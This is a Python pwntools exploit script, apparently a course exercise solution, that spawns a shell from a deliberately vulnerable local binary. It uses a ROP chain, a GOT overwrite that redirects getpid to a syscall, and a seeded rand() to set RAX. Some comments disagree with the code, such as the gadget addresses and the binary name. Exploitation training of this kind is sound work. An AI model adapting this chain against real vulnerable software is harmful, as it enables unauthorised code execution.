################################################################################
# ex5-exploit.py
#   Chapter: 01
#   Binary: ex5
#   Source: ex5.c
#   Goal:   spawm a shell by calling execve("/bin/sh\x00",NULL,NULL); No
#           leaks of libc6. This time, we need to set 0x3b into RAX by
#           taking advantatge of randByte()...
################################################################################
from pwn import *
from ctypes import CDLL

################################################################################
# randRAX()
#   We call srand(1) and then we figure out how many times we need to call
#   randByte() in order to get 0x3b. We return how many times.
################################################################################
def randRAX():
    r = 1
    libc = CDLL("libc.so.6")
    libc.srand(1)
    while True:
        val = libc.rand() & 0xff
        if val == 0x3b:
            break
        r+=1
    return r

# Binary protections:
# checksec --file ex3
#    Arch:     amd64-64-little
#    RELRO:    Partial RELRO            We can overwrite the got
#    Stack:    No canary found          We can smash the stack as we please
#    NX:       NX enabled               We need ROP (stack is non-executable)
#    PIE:      No PIE (0x400000)        We don't need a memory leak
vuln    =   "./ex5"
binary  =   ELF(vuln)

# We control EIP after padding + RBP:
padding =   b'A'*112
# A fake RBP value:
RBP     =   0xdeadbeefcafebabe

# Using ropper, we find the following ROP-gadgets we will need:
# 0x00000000004011d4: pop rdi; ret; 
# 0x00000000004011d8: pop rdx; ret; 
# 0x00000000004011d6: pop rsi; ret;
pop_rdi =   0x04011e3
pop_rsi =   0x04011e5
pop_rdx =   0x04011e7

# Let's compute how many times we beed to run randByte() in order to
# get 0x3b:
runs = randRAX()
warning("Total calls to randByte() for RAX=0x3b: %d" % runs)

# We start a local process of the vulnerable program:
r = process(binary.path)

# We want to set RAX to 0x3b; we do not have any ROP-gadget to
# achieve that. Notice that we can set RAX to 0 by returning to
# 0x0040116c:
#   0x000000000040116c: mov eax, 0; leave; ret;
#
# Can we re-purpose any called function from libc6?:
#
# [0x404000] getpid@GLIBC_2.2.5  →  0x7ffff7e78320
# [0x404008] memset@GLIBC_2.2.5  →  0x7ffff7ef5f50
# [0x404010] srand@GLIBC_2.2.5  →  0x7ffff7de3700
# [0x404018] gets@GLIBC_2.2.5  →  0x7ffff7e19fa0
# [0x404020] rand@GLIBC_2.2.5  →  0x401076

# Nope. srand returns nothing; rand returns a pseudo-random integer
# value. We need to re-purpose the function within the binary itself
# randByte(); to set 0x3b into RAX.
#
# This binary is not PIE; so we can use its addresses right away
# (we don't need a leak)

# The command will end up writing to the .bss segment:
cmd =   b'/bin/sh\x00'

# We need to put "/bin/sh\x00" into rdi. The program calls "memset",
# so we need to write each character at a time into a valid rw-
# section. *mydata seems to be the right place to write to:
cmd_addr    =   binary.symbols["mydata"]
info("We will write /bin/sh into mydata at 0x%02x" % cmd_addr)

# We can set RDX = 1 just once, so we do it outside the loop:
rop = b''
rop +=  p64(pop_rdx)
rop +=  p64(0x01)                               # rdx <- 0x1
for i in range(0,len(cmd)):
    rop +=  p64(pop_rdi)
    rop +=  p64(cmd_addr+i)                     # rdi <- &mydata[i]
    rop +=  p64(pop_rsi)
    rop +=  p64(cmd[i])                         # rsi <- char
    rop +=  p64(binary.symbols["plt.memset"])   # memset(&mydata[i],cmd[i],1)

# Please notice that we can also use plt.gets(cmd_addr) in order to write
# any string of our choice into cmd_addr. This way, we do not need to iterate
# and the payload will execute faster.

# Now, where to jump to? We now that alarm()+5 has the opcode "syscall"
# Dump of assembler code for function __GI_alarm:
#   0x00007ffff7e76b60 <+0>:	mov    eax,0x25
#   0x00007ffff7e76b65 <+5>:	syscall
# But of course we cannot overwrite got@alarm() because then we couldn't
# call alarm() to set RAX = 0x3b! We need another function:
# getpid:
#   Dump of assembler code for function __GI_getpid:
#   0x00007ffff7febac0 <+0>:	mov    eax,0x27
#   0x00007ffff7febac5 <+5>:	syscall
#   0x00007ffff7febac7 <+7>:	ret
# This value may vary on your local computer due to a different version of
# libc6. You can use gdb or r2 to find out how far apart "syscall" is from
# the start of getpid(). For example, on libc6 2.35 (Ubuntu Jammy), this value
# is 9 instead of 5:
# ┌ 12: int sym.getpid ();
# │           0x000ec040      f30f1efa       endbr64
# │           0x000ec044      b827000000     mov eax, 0x27               ; '\''
# │           0x000ec049      0f05           syscall        getpid()+9
# └           0x000ec04b      c3             ret
# This kind of tricks are discussed in Chapter 2 of the CreativePwning book.
rop +=  p64(pop_rdi)
rop +=  p64(binary.symbols["got.getpid"])
rop +=  p64(pop_rsi)
rop +=  p64(0x25)       # getpid()+5
rop +=  p64(pop_rdx)
rop +=  p64(0x1)        # rdx <- 1
# memset(&got.getpid,0x25,1);
rop +=  p64(binary.symbols["plt.memset"])

# In order to set rax to 0x3b, we need to call randByte(). But this function
# will return a pseudo-random byte each time, so we don't known when
# randByte() == 0x3b! If we do not try anything else, we will be setting
# RAX to a random byte and hope for the best!
# The trick is to call srand ourselves with our own seed. For example:
# srand(1). We can compute when randByte() == 0x3b beforehand (see randRAX()):
rop +=  p64(pop_rdi)
rop +=  p64(0x1)                            # rdi <- 0x1
rop +=  p64(binary.symbols["plt.srand"])    # srand(0x1);
# Now, we need to call randByte() as many times as needed until reaching
# the value 0x3b. We know how many times thanks to randRAX():
for i in range(0,runs):
    rop +=  p64(binary.symbols["randByte"])     # rax = randByte()

# So, at this point, RAX = 0x3b; we set the rest of the arguments now for
# execve() and the we return there:
rop     +=  p64(pop_rdi)
rop     +=  p64(cmd_addr)       # rdi <- &"/bin/sh\x00"
rop     +=  p64(pop_rsi)
rop     +=  p64(0x0)            # char **argp[] = NULL;
rop     +=  p64(pop_rdx)
rop     +=  p64(0x0)            # char **envp[] = NULL;
# Now, calling getpid@plt() will triger execve():
rop     +=  p64(binary.symbols["plt.getpid"])
r.send(padding + p64(RBP) + rop + b'\x0a')
r.interactive()
r.close()
